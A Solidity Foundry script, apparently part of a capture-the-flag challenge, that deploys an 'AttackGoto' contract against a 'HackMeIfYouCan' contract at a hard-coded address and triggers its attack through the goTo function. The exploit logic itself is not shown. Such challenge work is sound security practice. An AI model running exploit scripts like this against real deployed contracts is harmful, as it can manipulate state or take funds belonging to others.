// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {AttackGoto} from "../src/AttackGoto.sol"; 
contract attackHackMe is Script {
    HackMeIfYouCan public hackMeContract;
    AttackGoto public attackGoto;

    function setUp() public {}

    function run() public {
        address payable hackMeAddress = payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        hackMeContract = HackMeIfYouCan(hackMeAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attackGoto = new AttackGoto(hackMeAddress);
        console.log("attackgoto deployed at:", address(attackGoto));

        // Effectuer l'attaque en utilisant goTo
        uint256 floor = 1;
        attackGoto.attack(floor);
        console.log("ok ok ok ok");

        vm.stopBroadcast();
    }
}





